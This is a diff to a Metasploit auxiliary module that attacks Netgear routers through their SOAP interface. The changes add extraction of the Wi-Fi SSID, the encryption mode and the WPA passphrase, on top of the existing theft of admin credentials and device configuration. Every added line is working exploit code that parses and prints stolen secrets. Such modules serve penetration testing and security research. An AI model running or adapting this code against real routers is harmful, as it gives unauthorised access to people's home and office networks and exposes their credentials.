@@ -37,9 +37,11 @@ class MetasploitModule < Msf::Auxiliary
       'Author'      =>
         [
           'Peter Adkins <peter.adkins[at]kernelpicnic.net>', # Vulnerability discovery
-          'Michael Messner <devnull[at]s3cur1ty.de>'	     # Metasploit module
+          'Michael Messner <devnull[at]s3cur1ty.de>',	     # Metasploit module
+          'h00die <mike@shorebreaksecurity.com>'       # Metasploit enhancements/docs
         ],
-      'License'     => MSF_LICENSE
+      'License'     => MSF_LICENSE,
+      'DisclosureDate' => 'Feb 11 2015'
     )
   end
 
@@ -54,6 +56,16 @@ class MetasploitModule < Msf::Auxiliary
     # extract credentials
     action = 'urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo'
     print_status("Extracting credentials...")
+    extract_data(action)
+
+    # extract wifi info
+    action = 'urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetInfo'
+    print_status("Extracting Wifi...")
+    extract_data(action)
+
+    # extract WPA info
+    action = 'urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetWPASecurityKeys'
+    print_status("Extracting WPA Keys...")
     extract_data(action)
   end
 
@@ -91,6 +103,21 @@ class MetasploitModule < Msf::Auxiliary
         #store all details as loot
         loot = store_loot('netgear_soap_device.config', 'text/plain', rhost, res.body)
         print_good("Device details downloaded to: #{loot}")
+      end
+
+      if res.body =~ /<NewSSID>(.*)<\/NewSSID>/
+        ssid = $1
+        print_good("Wifi SSID: #{ssid}")
+      end
+
+      if res.body =~ /<NewBasicEncryptionModes>(.*)<\/NewBasicEncryptionModes>/
+        wifi_encryption = $1
+        print_good("Wifi Encryption: #{wifi_encryption}")
+      end
+
+      if res.body =~ /<NewWPAPassphrase>(.*)<\/NewWPAPassphrase>/
+        wifi_password = $1
+        print_good("Wifi Password: #{wifi_password}")
       end
 
     rescue ::Rex::ConnectionError
